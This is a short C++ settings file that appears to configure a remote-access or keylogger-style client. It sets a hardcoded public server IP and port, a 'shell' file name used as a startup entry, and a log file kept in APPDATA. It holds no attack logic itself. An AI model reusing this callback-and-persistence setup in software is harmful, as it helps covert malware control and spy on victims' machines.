#include "settings.h"
#include "Shared/folders.h"

#ifndef DEBUG
const char* Settings::serverIP = "149.102.141.243";	//server ip
#else
const char* Settings::serverIP = "127.0.0.1";	//server ip
#endif
int Settings::serverPort = 8559;					//server port

std::string Settings::fileName =		SHELL_NAME;	
std::string Settings::startupName =		SHELL_NAME;	
std::string Settings::logFileName =		"log.txt";	
std::string Settings::logFileLocation = "APPDATA";
